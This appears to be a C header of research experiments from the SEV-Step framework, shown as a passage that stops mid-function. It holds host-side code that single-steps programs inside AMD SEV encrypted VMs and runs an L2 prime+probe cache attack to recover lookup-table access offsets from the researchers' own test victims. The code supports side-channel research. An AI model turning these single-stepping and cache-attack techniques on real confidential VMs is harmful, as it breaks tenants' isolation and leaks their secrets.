#ifndef PAPER_EXPERIMENTS_H
#define PAPER_EXPERIMENTS_H


#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>

#include "../../sev-step-lib/ansi-color-codes.h"
#include "../../sev-step-lib/sev_step_api.h"
#include "../../sev-step-lib/sev_step_eviction_set_builders.h"
#include "../../sev-step-lib/sev_step_pagemap_parser.h"
#include "../../sev-step-lib/sev_step_cache_attack_log.h"
#include "../../sev-step-lib/sev_step_print_macros.h"


#include "../../end2end-tests/host-client/my-error-codes.h"
#include "../../end2end-tests/host-client/vm-server-client.h"
#include "../../end2end-tests/host-client/helpers.h"
#include "../../end2end-tests/host-client/test_definitions.h"

typedef struct
{
    int timer_value;
    // if true, we expect step events to contain rip data and check them against the expected offsets
    bool check_debug_rip;
    // whether guest tlb should be flushed before each step
    bool flush_tlb;
    // whether accessed bit of page containing the nop slide should be reset
    bool reset_access_bit;
} paper_experiments_nop_slide_args_t;
int paper_experiments_nop_slide(char *format_prefix, void *void_args)
{
    //
    // Initialize API connection and prepare tracked pages on server/vm side
    //
    paper_experiments_nop_slide_args_t *args = (paper_experiments_nop_slide_args_t *)void_args;

    usp_poll_api_ctx_t ctx;
    int res = HOST_CLIENT_SUCCESS;
    usp_event_type_t event_type;
    void *event_buffer = NULL;

    bool api_open = false;
    printf("%sInitializing API...\n", format_prefix);
    if (SEV_STEP_ERR == usp_new_ctx(&ctx, args->check_debug_rip))
    {
        printf("%s" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n", format_prefix);
        return HOST_CLIENT_ERROR;
    }
    printf("%sAPI initialization done!\n", format_prefix);
    api_open = true;

    victim_program_data_t *victim_program_data = malloc(sizeof(victim_program_data_t));
    printf("%scalling vm_server_single_step_victim_init to prepare scenario\n", format_prefix);
    if (HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_NOP_SLIDE, victim_program_data))
    {
        printf("%svm_server_single_step_victim_init " BRED "FAILED\n" reset, format_prefix);
        res = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    // TODO: +4096 is not guaranteed to work here!
    uint64_t victim_pages[] = {victim_program_data->gpa};
    int victim_pages_len = sizeof(victim_pages) / sizeof(victim_pages[0]);
    printf("%s Victim program: VADDR is 0x%lx\n",
           format_prefix, victim_program_data->vaddr);

    //
    // Exec track gpa of victim function and signal vm server to start victim program async
    // Then, enter main event loop
    //

    printf("%stracking victim pages with mode %s\n", format_prefix, tracking_mode_to_string(KVM_PAGE_TRACK_EXEC));
    if (SEV_STEP_OK != track_pages(&ctx, victim_pages, victim_pages_len, KVM_PAGE_TRACK_EXEC))
    {
        printf("%sinitial track pages FAILED\n" reset, format_prefix);
        res = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%scalling vm_server_single_step_victim_start\n", format_prefix);
    if (HOST_CLIENT_ERROR == vm_server_single_step_victim_start(VICTIM_PROGRAM_NOP_SLIDE))
    {
        printf("%svm_server_single_step_victim_start " BRED "FAILED\n" reset, format_prefix);
        res = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sentering main event loop\n", format_prefix);

    // if true, the last page fault event belonged to the target pages
    bool on_victim_pages = false;

    uint64_t zero_steps_on_target = 0;
    uint64_t single_steps_on_target = 0;
    uint64_t multi_steps_on_target = 0;
#define MULT_STEP_SIZES_MAX_LEN 1000
    uint64_t multi_step_sizes[MULT_STEP_SIZES_MAX_LEN];
    uint64_t multi_step_sizes_len = 0;

    /*We expect the victim program do be done after this many events. Contains some slack to account for scheduling and zero steps
    vicim_program_data.expected_offsets_len is the exact number of instructions/single step events for the target
    */
    int upper_event_thresh = 2 * victim_program_data->expected_offsets_len;
    // if true, we have single stepped through the whole target program successfully
    bool finished_single_stepping_target = false;

    for (int current_event_idx = 0; current_event_idx < upper_event_thresh && !finished_single_stepping_target; current_event_idx++)
    {

        printf("%sWaiting next event, event_idx=%d\n", format_prefix, current_event_idx);
        if (SEV_STEP_ERR == usp_block_until_event(&ctx, &event_type, &event_buffer))
        {
            printf("%susp_block_until_event" BRED " FAILED\n" reset, format_prefix);
            res = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        if (event_type == PAGE_FAULT_EVENT)
        {
            usp_page_fault_event_t *pf_event = (usp_page_fault_event_t *)event_buffer;
            printf("%s Pagefault Event: {GPA:0x%lx}\n", format_prefix, pf_event->faulted_gpa);

            if (on_victim_pages)
            {
                if (elem_is_in_array(pf_event->faulted_gpa, victim_pages, victim_pages_len))
                {
                    printf("%s on_victim_pages=true but got fault for victim page! This should not happen\n", format_prefix);
                    res = HOST_CLIENT_ERROR;
                    goto cleanup;
                }
                else
                {
                    printf("%s Left victim pages with fault at GPA 0x%lx. Disabling single stepping and re-tracking victim pages\n",
                           format_prefix, pf_event->faulted_gpa);
                    if (SEV_STEP_OK != disable_single_stepping(&ctx))
                    {
                        printf("%sfailed to disable single stepping\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    // track only the target page
                    if (SEV_STEP_OK != untrack_all_pages(&ctx, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%suntrack_all_pages failed\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (SEV_STEP_OK != track_pages(&ctx, victim_pages, victim_pages_len, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%strack pages FAILED\n" reset, format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    on_victim_pages = false;

                    print_step_histogram_args_t histogram_args = {
                        .want_runs = 1,
                        .timer_value = args->timer_value,
                        .total_zero_step_count = zero_steps_on_target,
                        .total_single_step_count = single_steps_on_target,
                        .total_multi_step_count = multi_steps_on_target,
                        .total_step_count = zero_steps_on_target + single_steps_on_target + multi_steps_on_target,
                    };
                    print_step_histogram(format_prefix, histogram_args);
                    if (multi_step_sizes_len > 0)
                    {
                        printf("%smulti_step_sizes = [", format_prefix);
                        for (uint64_t i = 0; i < multi_step_sizes_len; i++)
                        {
                            printf("%ju, ", multi_step_sizes[i]);
                        }
                        printf("]\n");
                    }
                    printf("%s access bit reset trick:%d flush tlb trick: %d\n", format_prefix, args->reset_access_bit, args->flush_tlb);
                }
            }
            else
            { // currently not on victim pages
                if (elem_is_in_array(pf_event->faulted_gpa, victim_pages, victim_pages_len))
                {
                    printf("%s entering victim pages. enabling single stepping (timer 0x%x) and tracking all but the target page\n",
                           format_prefix, args->timer_value);

                    // track all pages but the target page
                    if (SEV_STEP_OK != track_all_pages(&ctx, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%strack_all_pages failed\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (SEV_STEP_OK != untrack_pages(&ctx, victim_pages, victim_pages_len, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%suntrack_pages failed\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    uint64_t *reset_access_bit_gpas = NULL;
                    uint64_t reset_access_bit_gpas_len = 0;
                    if (args->reset_access_bit)
                    {
                        reset_access_bit_gpas = victim_pages;
                        reset_access_bit_gpas_len = victim_pages_len;
                    }
                    if (SEV_STEP_OK != enable_single_stepping_ex(&ctx, args->timer_value, reset_access_bit_gpas, reset_access_bit_gpas_len, args->flush_tlb))
                    {
                        printf("%sfailed to enable single stepping\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    on_victim_pages = true;
                }
                else
                {
                    printf("currently not on victim pages and page fault is not on victim pages : nothing to do\n");
                }
            }
        }
        else if (event_type == SEV_STEP_EVENT)
        {
            sev_step_event_t *step_event = (sev_step_event_t *)event_buffer;
            print_single_step_event(format_prefix, step_event);

            if (!on_victim_pages)
            {
                printf("%s on_victim_pages=false but single step event. This should not happen\n", format_prefix);
                res = HOST_CLIENT_ERROR;
                goto cleanup;
            }

            switch (step_event->counted_instructions)
            {
            case 0:
                zero_steps_on_target += 1;
                break;
            case 1:
                single_steps_on_target += 1;

                if (args->check_debug_rip && (single_steps_on_target < victim_program_data->expected_offsets_len))
                {
                    if (!step_event->is_decrypted_vmsa_data_valid)
                    {
                        printf("%s" BHRED "NO VMSA DATA" reset " args->check_debug_rip was specified but VMSA data not valid\n", format_prefix);
                        res = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    uint64_t expected_vaddr = victim_program_data->vaddr + victim_program_data->expected_offsets[single_steps_on_target - 1];
                    uint64_t rip = step_event->decrypted_vmsa_data.register_values[VRN_RIP];
                    if ((rip >> 12) != (expected_vaddr >> 12))
                    {
                        printf("%s" BHRED "vaddr check failed: page part of vaddr is wrong, single_steps_on_target = %ju, expected vaddr 0x%lx got 0x%lx\n" reset,
                               format_prefix, single_steps_on_target, expected_vaddr, rip);
                        // res = HOST_CLIENT_ERROR;
                        // goto cleanup;
                    }
                    if (rip != expected_vaddr)
                    {
                        printf("%s" BHRED "vaddr check failed:  single_steps_on_target = %ju,"
                               " page part correct, expected page offset 0x%lx got 0x%lx\n" reset,
                               format_prefix, single_steps_on_target, expected_vaddr & 0xfff, rip & 0xfff);
                        // res = HOST_CLIENT_ERROR;
                        // goto cleanup;
                    }
                    printf("%s step event is at expected vaddr\n", format_prefix);
                }

                if (single_steps_on_target > victim_program_data->expected_offsets_len)
                {
                    printf("%sFinished single stepping target program !\n", format_prefix);
                    finished_single_stepping_target = true;
                }

                break;
            default:
                printf("%s" BHRED "MULTISTEP" reset, format_prefix);
                multi_steps_on_target += 1;
                if (multi_step_sizes_len < MULT_STEP_SIZES_MAX_LEN)
                {
                    multi_step_sizes[multi_step_sizes_len] = step_event->counted_instructions;
                    multi_step_sizes_len += 1;
                }
                else
                {
                    flf_printf("multi_step_sizes overflow! Not storing step size\n");
                }

                // res = HOST_CLIENT_ERROR;
                // goto cleanup;
                break;
            }
        }
        else
        {
            printf("%s Unexpected event type! Aborting\n", format_prefix);
            res = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        printf("%ssending ack for event_idx %d\n", format_prefix, current_event_idx);
        usp_ack_event(&ctx);
        free_usp_event(event_type, event_buffer);
        event_buffer = NULL;

    } // end of main event loop

    printf("%sClosing API...\n", format_prefix);
    if (SEV_STEP_ERR == usp_close_ctx(&ctx))
    {
        printf("%s" BRED "usp_close_ctx failed." reset " Check dmesg for more information\n", format_prefix);
        res = HOST_CLIENT_ERROR;
        api_open = false;
        goto cleanup;
    }
    else
    {
        printf("%sAPI closed!\n", format_prefix);
    }
    api_open = false;

    print_step_histogram_args_t histogram_args = {
        .want_runs = 1,
        .timer_value = args->timer_value,
        .total_zero_step_count = zero_steps_on_target,
        .total_single_step_count = single_steps_on_target,
        .total_multi_step_count = multi_steps_on_target,
        .total_step_count = zero_steps_on_target + single_steps_on_target + multi_steps_on_target,
    };
    print_step_histogram(format_prefix, histogram_args);
    if (multi_step_sizes_len > 0)
    {
        printf("%smulti_step_sizes = [", format_prefix);
        for (uint64_t i = 0; i < multi_step_sizes_len; i++)
        {
            printf("%ju, ", multi_step_sizes[i]);
        }
        printf("]\n");
    }
    printf("%s access bit reset trick:%d flush tlb trick: %d\n", format_prefix, args->reset_access_bit, args->flush_tlb);


    if (!finished_single_stepping_target)
    {
        printf("%s" BHRED "Did not finish target!. Wanted %lu single step events on target, got only %ju\n" reset,
               format_prefix, victim_program_data->expected_offsets_len, single_steps_on_target);
        res = HOST_CLIENT_ERROR;
        goto cleanup;
    };

    //
    // interact with the vm to ensure that it is not stuck
    //
    bool vm_alive = false;
    for (int retries = 1; !vm_alive && retries >= 0; retries--)
    {
        victim_program_data_t *_dummy = malloc(sizeof(victim_program_data_t));
        printf("%ssending dummy request to vm to ensure that it is alive and well\n", format_prefix);
        if (HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_NOP_SLIDE, _dummy))
        {
            printf("%sdummy request " BRED "FAILED. %d retries remaining\n" reset, format_prefix, retries);
        }
        else
        {
            vm_alive = true;
        }
        free_victim_program_data_t(_dummy);
    }
    if (vm_alive)
    {
        printf("%s VM seems to be alive and well\n", format_prefix);
    }
    else
    {
        printf("%svm is stuck\n", format_prefix);
        res = HOST_CLIENT_ERROR;
        goto cleanup;
    }

cleanup:
    if (api_open)
    {
        printf("%sClosing API...\n", format_prefix);
        if (SEV_STEP_ERR == usp_close_ctx(&ctx))
        {
            printf("%s" BRED "usp_close_ctx failed." reset " Check dmesg for more information\n", format_prefix);
            res = HOST_CLIENT_ERROR;
        }
        else
        {
            printf("%sAPI closed!\n", format_prefix);
        }
    }

    if (event_buffer != NULL)
    {
        free_usp_event(event_type, event_buffer);
    }
    free_victim_program_data_t(victim_program_data);

    return res;
}

typedef struct
{
    /// @brief value for apic timer
    int timer_value;
    /// @brief timer value to force zero step
    int zero_step_timer_value;
    /// @brief if > 0, do use zero_step_timer_value value for this many step events on each cache attack target
    /// before using the regular timer_value. Intended to force zero steps
    int forced_zero_steps_per_mem_access;
    /// @brief if true, we assume that we have access to rip through
    /// sev snp debug a api
    bool check_debug_rip;
    /// @brief  attack target to request from the vm-server
    victim_program_t cache_attack_target;
} paper_experiment_prime_probe_args_t;
/**
 * @brief Test a realistic cache attack scenario : Single step target until memory access offset is
 * reached. Then perform and evaluate cache attack using the data provided from the vm-server
 *
 * @param fp
 * @param void_args
 * @return int
 */
int paper_experiment_prime_probe(char *fp, void *void_args)
{
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;
    cache_attack_logfile_t *cache_attack_log = NULL;
    uint8_t **ev1_base_mappings = NULL;
    uint64_t ev1_base_mappings_len;
    usp_poll_api_ctx_t ctx;
    victim_program_data_t *victim_program_data = NULL;

    paper_experiment_prime_probe_args_t *args = (paper_experiment_prime_probe_args_t *)void_args;

    //
    // Preparing eviction set in user space
    // - request data from test server
    // - translate gpa to hpa via kvm api
    // - build eviction set
    // - import eviction set into kernel
    //

    victim_program_data = malloc(sizeof(victim_program_data_t));
    printf("%s%s:%d calling vm_server_single_step_victim_init to prepare scenario\n", fp, __FILE__, __LINE__);
    if (HOST_CLIENT_ERROR == vm_server_single_step_victim_init(args->cache_attack_target, victim_program_data))
    {
        printf("%s%s:%d vm_server_single_step_victim_init " BRED "FAILED\n" reset, fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Victim program GPA is 0x%lx and VADDR is 0x%lx\n", fp, __FILE__, __LINE__,
           victim_program_data->gpa, victim_program_data->vaddr);
    printf("%s%s:%d Lookup table has GPA 0x%lx and VADDR 0x%lx and is 0x%lx bytes long\n", fp, __FILE__, __LINE__,
           victim_program_data->cache_attack_data->lookup_table_gpa, victim_program_data->cache_attack_data->lookup_table_vaddr,
           victim_program_data->cache_attack_data->lookup_table_bytes);

    printf("%s%s:%d Initializing API...\n", fp, __FILE__, __LINE__);
    if (SEV_STEP_ERR == usp_new_ctx(&ctx, args->check_debug_rip))
    {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
               fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n", fp, __FILE__, __LINE__);
    api_open = true;

    printf("%s%s:%d Translating lookup table GPA to HPA...\n", fp, __FILE__, __LINE__);
    uint64_t lookup_table_hpa;
    if (SEV_STEP_ERR == sev_step_gpa_to_hpa(&ctx, victim_program_data->cache_attack_data->lookup_table_gpa,
                                            &lookup_table_hpa))
    {

        printf("%s%s:%d : sev_step_gpa_to_hpa:" BHRED " FAILED\n" reset, fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d HPA for lookup table is 0x%lx...\n", fp, __FILE__, __LINE__, lookup_table_hpa);

    lookup_table_eviction_set_t lookup_table_eviction_set;
    uint64_t way_count = 8;

    printf("%s:%d: Allocating Eviction set for table...\n", __FILE__, __LINE__);
    if (SEV_STEP_ERR == epyc3_build_l2_eviction_set_for_lookup_table_parallel_reuse(&lookup_table_hpa, 1,
                                                                                    victim_program_data->cache_attack_data->lookup_table_bytes,
                                                                                    &lookup_table_eviction_set, &ev1_base_mappings, &ev1_base_mappings_len, way_count))
    {

        printf("%s%s:%d : epyc3_build_l2_eviction_set_for_lookup_table:" BHRED " FAILED\n" reset, fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    lookup_table_eviction_set_t evs[] = {lookup_table_eviction_set};
    lookup_table_t luts[] = {
        {
            // TODO: refactor this. Our attack does not depend on vaddr. However, we also don't use this in kernel
            // attack code right now (so no harm done other than confusion)
            .base_vaddr_table = victim_program_data->cache_attack_data->lookup_table_vaddr,
            .table_bytes = victim_program_data->cache_attack_data->lookup_table_bytes,
        },
    };
    import_user_eviction_set_param_t api_params = {
        .attack_targets = luts,
        .eviction_sets = evs,
        .len = 1,
        .way_count = way_count,
        .cache_attack_perf = host_os_l2_miss_from_l1_dc_miss,
    };
    printf("%s%s:%d Got %lu lut and %lu eviction sets with %lu entries each\n",
           fp, __FILE__, __LINE__, api_params.len, api_params.eviction_sets->eviction_sets_len,
           api_params.way_count);

    printf("%s%s:%d Calling sev_step_import_user_evs\n", fp, __FILE__, __LINE__);
    if (SEV_STEP_ERR == sev_step_import_user_evs(&ctx, &api_params))
    {
        printf("%s%s:%d sev_step_import_user_evs" BRED "FAILED\n" reset,
               fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    flf_printf("Calling cache_attack_log_new_log\n");
    cache_attack_log = cache_attack_log_new_log(
        api_params.attack_targets,
        api_params.len,
        "perf name todo",
        way_count);
    if (cache_attack_log == NULL)
    {
        printf("%s cache_attack_log_new_log " BRED " FAILED\n" reset, fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    /*
     * Perform Simple Prime and Probe Test
     * Now we have prepared our eviction set
     * Lets run the victim program and perform the cache attack
     * This is similar to test_single_step_nop_slide. However, we have additional logic to
     * do the cache attack
     */

    //
    // Exec track gpa of victim function and signal vm server to start victim program async
    // Then, enter main event loop
    //

    printf("%stracking gpa 0x%lx with mode %s\n", fp, victim_program_data->gpa, tracking_mode_to_string(KVM_PAGE_TRACK_EXEC));
    if (SEV_STEP_OK != track_page(&ctx, victim_program_data->gpa, KVM_PAGE_TRACK_EXEC))
    {
        printf("%sinitial track page for 0x%lx" BRED " FAILED\n" reset, fp, victim_program_data->gpa);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%scalling vm_server_single_step_victim_start\n", fp);
    if (HOST_CLIENT_ERROR == vm_server_single_step_victim_start(args->cache_attack_target))
    {
        printf("%svm_server_single_step_victim_start " BRED "FAILED\n" reset, fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sentering main event loop\n", fp);

    usp_event_type_t event_type;
    void *event_buffer;

    // if true, the last page fault event belonged to the target pages
    bool on_victim_pages = false;

    uint64_t single_steps_on_target = 0;

    /*We expect the victim program do be done after this many events. Contains some slack to account for scheduling and zero steps
    victim_program_data->expected_offsets_len is the exact number of instructions/single step events for the target
    */
    int upper_event_thresh = 20 * victim_program_data->expected_offsets_len;
    // if true, we have single stepped through the whole target program successfully
    bool finished_single_stepping_target = false;

    bool do_cache_attack_until_next_single_step = false;
    uint64_t expected_cache_attack_offset = 0;
    // do_cache_attack_until_next_single_step is true, this contains the index of the attacked lookup table
    uint64_t attacked_lookup_table = 0;

    // we use this to force some zero steps for each cache attack. We want to find out whether we can use
    // zero steps to repeatedly observe the same memory access
    int remaining_forced_zero_steps_for_cache_attack = 0;

    uint64_t cache_attack_counter = 0;
    uint64_t successful_cache_attacks = 0;

    for (int current_event_idx = 0; current_event_idx < upper_event_thresh && !finished_single_stepping_target; current_event_idx++)
    {

        printf("%sWaiting next event, event_idx=%d\n", fp, current_event_idx);
        if (SEV_STEP_ERR == usp_block_until_event(&ctx, &event_type, &event_buffer))
        {
            printf("%susp_block_until_event" BRED " FAILED\n" reset, fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        if (event_type == PAGE_FAULT_EVENT)
        {
            usp_page_fault_event_t *pf_event = (usp_page_fault_event_t *)event_buffer;
            printf("%s Pagefault Event: {GPA:0x%lx}\n", fp, pf_event->faulted_gpa);

            if (on_victim_pages)
            {
                if (pf_event->faulted_gpa == victim_program_data->gpa)
                {
                    printf("%s on_victim_pages=true but got fault for victim page! This should not happen\n", fp);
                    exit_code = HOST_CLIENT_ERROR;
                    goto cleanup;
                }
                else
                {
                    printf("%s Left victim pages with fault at GPA 0x%lx. Disabling single stepping and re-tracking victim pages\n",
                           fp, pf_event->faulted_gpa);
                    if (SEV_STEP_OK != disable_single_stepping(&ctx))
                    {
                        printf("%sfailed to disable single stepping\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    // track only the target page
                    if (SEV_STEP_OK != untrack_all_pages(&ctx, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%suntrack_all_pages failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (SEV_STEP_OK != track_page(&ctx, victim_program_data->gpa, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%sfailed to to track victim page\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    on_victim_pages = false;
                }
            }
            else
            { // currently not on victim pages
                if (pf_event->faulted_gpa == victim_program_data->gpa)
                {
                    printf("%s entering victim pages. enabling single stepping (timer 0x%x) and tracking all but the target page\n",
                           fp, args->timer_value);

                    // track all pages but the target page
                    if (SEV_STEP_OK != track_all_pages(&ctx, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%strack_all_pages failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (SEV_STEP_OK != untrack_page(&ctx, victim_program_data->gpa, KVM_PAGE_TRACK_EXEC))
                    {
                        printf("%suntrack_page failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    if (SEV_STEP_OK != enable_single_stepping(&ctx, args->timer_value, &(victim_program_data->gpa), 1))
                    {
                        printf("%sfailed to enable single stepping\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    on_victim_pages = true;
                }
                else
                {
                    printf("currently not on victim pages and page fault is not on victim pages : nothing to do\n");
                }
            }
        }
        else if (event_type == SEV_STEP_EVENT)
        {
            sev_step_event_t *step_event = (sev_step_event_t *)event_buffer;
            print_single_step_event(fp, step_event);

            if (!on_victim_pages)
            {
                printf("%s on_victim_pages=false but single step event. This should not happen\n", fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
            }

            switch (step_event->counted_instructions)
            {
            case 0:

                if (do_cache_attack_until_next_single_step)
                {
                    printf("%sZero Stepped, re-priming cache. Was forced zero-step? %d\n", fp, remaining_forced_zero_steps_for_cache_attack > 0);
                    if (SEV_STEP_OK != sev_step_do_cache_attack_next_step(&ctx, 0, remaining_forced_zero_steps_for_cache_attack > 0, args->zero_step_timer_value))
                    {
                        printf("%sev_step_do_cache_attack_next_step failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (remaining_forced_zero_steps_for_cache_attack > 0)
                    {
                        remaining_forced_zero_steps_for_cache_attack -= 1;
                    }

                    int res = cache_attack_log_add_trace(
                        cache_attack_log,
                        attacked_lookup_table,
                        step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,
                        step_event->cache_attack_data_len,
                        expected_cache_attack_offset,
                        step_event->counted_instructions,
                        single_steps_on_target - 1,
                        NULL
                    );
                    if (SEV_STEP_ERR == res)
                    {
                        printf("%scache_attack_log_add_trace failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                }

                break;
            case 1:
                single_steps_on_target += 1;

                if (step_event->cache_attack_timings != NULL)
                {

                    if (remaining_forced_zero_steps_for_cache_attack > 0)
                    {
                        flf_printf(BHRED "WARNING: WANTED FORCED ZERO STEP GOT SINGLE STEP " reset);
                    }

                    /*print_cache_timings(fp, step_event->cache_attack_timings,
                                        step_event->cache_attack_perf_values, step_event->cache_attack_data_len,
                                        way_count, lookup_table_hpa, expected_cache_attack_offset);*/

                    if (HOST_CLIENT_ERROR == can_distinguish_expected_offset(
                                                 fp,
                                                 step_event->cache_attack_timings,
                                                 step_event->cache_attack_perf_values,
                                                 step_event->cache_attack_data_len,
                                                 way_count,
                                                 expected_cache_attack_offset))
                    {

                        printf("%s: can_distinguish_expected_offset" BHRED "FAILED\n" reset, fp);
                        /*exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;*/
                    }
                    else
                    {
                        printf("%s " BHGRN "CACHE ATTACK SUCCEEDED" reset ". Timing peak at expected offset!\n", fp);
                        successful_cache_attacks += 1;
                    }

                    flf_printf("Serializing cache trace to log data structure\n");
                    int res = cache_attack_log_add_trace(
                        cache_attack_log,
                        attacked_lookup_table,
                        step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,
                        step_event->cache_attack_data_len,
                        expected_cache_attack_offset,
                        step_event->counted_instructions,
                        single_steps_on_target - 2,
                        NULL
                        );
                    if (SEV_STEP_ERR == res)
                    {
                        printf("%scache_attack_log_add_trace failed\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                }
                do_cache_attack_until_next_single_step = false;

                if (args->check_debug_rip && (single_steps_on_target < victim_program_data->expected_offsets_len))
                {
                    if (!step_event->is_decrypted_vmsa_data_valid)
                    {
                        printf("%s" BHRED "NO VMSA DATA" reset " but check debug rip requested!\n", fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    uint64_t expected_vaddr = victim_program_data->vaddr + victim_program_data->expected_offsets[single_steps_on_target - 1];
                    uint64_t rip = step_event->decrypted_vmsa_data.register_values[VRN_RIP];
                    if ((rip >> 12) != (expected_vaddr >> 12))
                    {
                        printf("%s" BHRED "vaddr check failed: page part of vaddr is wrong, single_steps_on_target = %ju,"
                               "expected vaddr 0x%lx got 0x%lx\n" reset,
                               fp, single_steps_on_target, expected_vaddr, rip);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if (rip != expected_vaddr)
                    {
                        printf("%s" BHRED "vaddr check failed:  single_steps_on_target = %ju,"
                               " page part correct, expected page offset 0x%lx got 0x%lx\n" reset,
                               fp, single_steps_on_target, expected_vaddr & 0xfff, rip & 0xfff);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    printf("%s step event is at expected vaddr\n", fp);
                }

                if ((single_steps_on_target - 1) < victim_program_data->expected_offsets_len)
                {
                    // Check if we should perform a cache attack. Remember. RIP points to next instruction
                    uint64_t assumed_offset = victim_program_data->expected_offsets[single_steps_on_target - 1];
                    int cache_attack_idx;
                    for (uint64_t i = 0; i < victim_program_data->cache_attack_data->len; i++)
                    {
                        if (victim_program_data->cache_attack_data->offsets_with_mem_access[i] == assumed_offset)
                        {
                            do_cache_attack_until_next_single_step = true;
                            remaining_forced_zero_steps_for_cache_attack = 0;
                            cache_attack_counter += 1;
                            cache_attack_idx = i;
                            break;
                        }
                    }

                    if (do_cache_attack_until_next_single_step)
                    {
                        printf("%sRequesting Cache Attack\n", fp);
                        expected_cache_attack_offset = victim_program_data->cache_attack_data->mem_access_target_offset[cache_attack_idx];
                        printf("%s" BHYEL "Expecting an access to offset 0x%lx\n" reset, fp, expected_cache_attack_offset);
                        if (SEV_STEP_OK != sev_step_do_cache_attack_next_step(
                                               &ctx, attacked_lookup_table,
                                               remaining_forced_zero_steps_for_cache_attack > 0,
                                               single_steps_on_target - 1))
                        {
                            printf("%sev_step_do_cache_attack_next_step failed\n", fp);
                            exit_code = HOST_CLIENT_ERROR;
                            goto cleanup;
                        }
                    }
                }

                if (single_steps_on_target > victim_program_data->expected_offsets_len)
                {
                    printf("%sFinished single stepping target program !\n", fp);
                    finished_single_stepping_target = true;
                }

                break;
            default:
                printf("%s" BHRED "MULTISTEP" reset, fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
                break;
            }
        }
        else
        {
            printf("%s Unexpected event type! Aborting\n", fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        printf("%ssending ack for event_idx %d\n", fp, current_event_idx);
        free_usp_event(event_type, event_buffer);
        usp_ack_event(&ctx);
    } // end of main event loop

    if (SEV_STEP_OK != disable_single_stepping(&ctx))
    {
        printf("%sfailed to disable single stepping\n", fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Calling sev_step_free_evs\n", fp, __FILE__, __LINE__);
    if (SEV_STEP_ERR == sev_step_free_evs(&ctx))
    {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
               fp, __FILE__, __LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sClosing API...\n", fp);
    if (SEV_STEP_ERR == usp_close_ctx(&ctx))
    {
        printf("%s" BRED "usp_close_ctx failed." reset " Check dmesg for more information\n", fp);
        exit_code = HOST_CLIENT_ERROR;
        api_open = false;
        goto cleanup;
    }
    else
    {
        printf("%sAPI closed!\n", fp);
    }
    api_open = false;

    flf_printf("Writing cache attack log to file\n");

    char *base_path = "./build/logs/paper_experiment_prime_probe";
    char *victim_program_name;
    victim_program_to_str(args->cache_attack_target, &victim_program_name);
    const uint64_t cache_log_filename_max = strlen(base_path) + strlen(victim_program_name) + 20;
